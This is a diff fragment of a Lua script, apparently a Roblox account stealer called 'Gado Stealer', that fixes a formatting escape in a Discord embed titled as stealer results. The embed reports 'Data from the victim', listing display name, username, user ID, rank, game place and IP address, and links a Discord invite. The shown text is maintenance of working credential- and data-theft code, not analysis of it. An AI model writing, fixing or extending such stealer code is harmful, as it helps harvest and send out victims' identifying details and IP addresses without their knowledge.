@@ -24,7 +24,7 @@ local msg = {
   ["embeds"]= {
     {
       ["title"]= "`Gado Stealer results`",
-      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\IP: "..ip.."",
+      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\nIP: "..ip.."",
       ["url"]= "https://discord.gg/nqny2McnjK",
       ["color"]= ""..webhookcolor.."",
       ["fields"]= {
